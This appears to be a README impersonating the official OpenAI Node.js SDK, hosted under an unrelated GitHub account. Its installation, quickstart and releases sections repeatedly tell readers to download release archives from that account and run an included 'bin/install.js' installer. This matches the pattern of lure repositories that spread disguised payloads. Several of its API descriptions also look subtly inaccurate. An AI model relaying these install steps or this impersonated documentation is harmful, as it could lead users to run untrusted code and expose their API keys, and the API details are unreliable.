# openai-node — Official Node.js & TypeScript SDK for OpenAI API

https://github.com/Newer98/openai-node/releases

[![Releases](https://img.shields.io/badge/Releases-GitHub-blue?logo=github)](https://github.com/Newer98/openai-node/releases) [![Node.js](https://img.shields.io/badge/Node.js-%3E%3D16-brightgreen?logo=node.js)](https://nodejs.org/) [![TypeScript](https://img.shields.io/badge/TypeScript-%3E%3D4.5-blue?logo=typescript)](https://www.typescriptlang.org/) [![npm](https://img.shields.io/badge/npm-v8-red?logo=npm)](https://www.npmjs.com/)

![AI Node Illustration](https://raw.githubusercontent.com/github/explore/main/topics/openai/openai.png)

Tags: nodejs, openai, typescript

openai-node provides a clear SDK for Node.js and TypeScript. It exposes REST endpoints, streaming, and typed interfaces. Use it to build chatbots, agents, assistants, and data pipelines that call OpenAI models.

Quick links
- Releases (download and run a packaged release): https://github.com/Newer98/openai-node/releases
- Package on npm: search for openai-node
- Docs: see the API reference in this README and the inline TypeScript types

Important: the releases page contains packaged assets. Download the release file and execute the installer or install the package. Example:
- Download openai-node-vX.Y.Z.tgz from https://github.com/Newer98/openai-node/releases
- Run:
  - tar -xzf openai-node-vX.Y.Z.tgz
  - cd openai-node-vX.Y.Z
  - npm install
  - node ./bin/install.js

Features
- Full TypeScript types for request and response shapes
- Support for REST and streaming responses
- Automatic retry for transient errors
- AbortController support for timeouts and cancellation
- Works in CommonJS and ESM projects
- Small runtime footprint, no native bindings

Compatibility
- Node.js v16 or later
- TypeScript 4.5 or later
- Browser support via bundlers (rollup, webpack, esbuild) for selected features

Table of contents
- Installation
- Quickstart
- Examples
  - Chat completion
  - Streaming completion
  - File upload and fine-tune
  - Rate limit handling
- Configuration
- API reference (core)
- Testing
- Contributing
- Security
- License
- Releases

Installation

Install from npm
- npm
  - npm install openai-node
- yarn
  - yarn add openai-node

Install a downloaded release package
- Download the release asset from https://github.com/Newer98/openai-node/releases
- Install locally
  - npm install ./openai-node-vX.Y.Z.tgz
- Or extract and run the supplied installer:
  - tar -xzf openai-node-vX.Y.Z.tgz
  - cd openai-node-vX.Y.Z
  - node ./bin/install.js

Quickstart (TypeScript)

1. Create an API key at OpenAI and export it:
- export OPENAI_API_KEY=sk-...

2. Minimal client
- import and use the client

Example:
```ts
import OpenAI from "openai-node";

const client = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });

async function run() {
  const res = await client.chat.completions.create({
    model: "gpt-4o-mini",
    messages: [
      { role: "system", content: "You are a helpful assistant." },
      { role: "user", content: "List three testing steps for an API client." }
    ],
    max_tokens: 200
  });

  console.log(res.choices[0].message.content);
}

run().catch(console.error);
```

Usage examples

Chat completion (sync)
- Use chat endpoint with typed messages.

```ts
const response = await client.chat.completions.create({
  model: "gpt-4o-mini",
  messages: [
    { role: "system", content: "Follow system rules." },
    { role: "user", content: "Write a short poem about code." }
  ],
  temperature: 0.7,
  max_tokens: 150
});

console.log(response.choices[0].message.content);
```

Streaming responses
- Use streaming to receive tokens as they arrive.
- The SDK returns an async iterable for tokens.

```ts
const stream = await client.chat.completions.stream({
  model: "gpt-4o-mini",
  messages: [{ role: "user", content: "Explain event loops." }]
});

for await (const chunk of stream) {
  // chunk has shape { delta: string, finish_reason?: string }
  process.stdout.write(chunk.delta);
}
```

File upload and fine-tune
- Upload files for fine-tuning or embeddings.

```ts
const upload = await client.files.upload({
  file: fs.createReadStream("./training-data.jsonl"),
  purpose: "fine-tune"
});

const fileId = upload.id;

await client.fineTunes.create({
  training_file: fileId,
  model: "gpt-4o-mini"
});
```

Rate limit and retry
- The SDK retries on 429 and 5xx by default. Configure backoff and max attempts.

```ts
const client = new OpenAI({
  apiKey: process.env.OPENAI_API_KEY,
  retry: {
    maxAttempts: 5,
    factor: 2,
    minTimeout: 1000
  }
});
```

Configuration

Client options
- apiKey: string (or set OPENAI_API_KEY)
- baseUrl: string (override API base URL)
- timeout: number (ms)
- retry: { maxAttempts, factor, minTimeout }
- proxy: string (proxy URL)
- fetch: custom fetch implementation for runtimes that lack fetch

Environment variables
- OPENAI_API_KEY: API key
- OPENAI_API_BASE: API base URL
- OPENAI_TIMEOUT: timeout in ms

TypeScript types
- The package exports types for requests and responses.
- Import types:
  - import type { ChatCompletionRequest, ChatCompletionResponse } from "openai-node";

API reference (core)

client.chat.completions.create(params)
- params:
  - model: string
  - messages: Array<{ role: "system" | "user" | "assistant"; content: string }>
  - temperature?: number
  - max_tokens?: number
  - stream?: boolean
- returns: ChatCompletionResponse or async iterable when stream true

client.files.upload({ file: Readable, purpose: string })
- returns: { id: string, filename: string, size: number }

client.embeddings.create({ model, input })
- returns: { data: Array<{ embedding: number[] }> }

client.fineTunes.create({ training_file, model, n_epochs? })
- returns: job object with id and status

Error handling
- Errors throw an Error with a status property and an error body.
- Use try/catch and inspect error.status and error.body for details.
- Use AbortController to cancel requests:
  - const controller = new AbortController();
  - client.chat.completions.create({ ..., signal: controller.signal });

Testing

Unit tests
- Run tests:
  - npm test
- The test suite uses Jest. Add OPENAI_API_KEY in CI to run integration tests.

Local development
- Clone the repo
- npm install
- npm run build
- npm link for local linking into a project

Contributing

Guidelines
- Open a clear issue before a large change
- Use main branch for development features
- Create small, focused pull requests
- Write tests for new features
- Keep TypeScript types accurate and updated

How to contribute
- Fork the repo
- Create a branch: feature/your-feature
- Run code formatters and linters
- Open a pull request with a clear description and tests

Security

Report issues
- If you find a security bug, open a private issue with reproducer and impact details.
- Provide minimal code to reproduce.

Secrets
- Do not commit API keys or secrets
- Use environment variables in CI

License

This project uses the MIT license. See the LICENSE file for details.

Releases

Download and run a release
- Visit the releases page and pick an asset:
  - https://github.com/Newer98/openai-node/releases
- The release page hosts packaged files. Download the file that matches your platform and extract it.
- Execute the installer or run npm install on the package:
  - npm install ./openai-node-vX.Y.Z.tgz
  - Or run the included installer script:
    - node ./bin/install.js

Badges and status
- The release badge above links to the release page:
  - [![Releases](https://img.shields.io/badge/Releases-GitHub-blue?logo=github)](https://github.com/Newer98/openai-node/releases)

Project assets
- Logo: generated from theme icons
- Examples: see examples/ directory in the repository
- API docs: inline with types and comments

Maintainers
- Core maintainers manage issues and PRs
- Community contributors handle patches, examples, and docs

Contact
- Open issues or pull requests on GitHub for bug reports and feature requests
- Use the Discussions tab for design questions and usage help

README images and badges
- Use shields for build and release status
- Use repository-themed images for README headers

End of file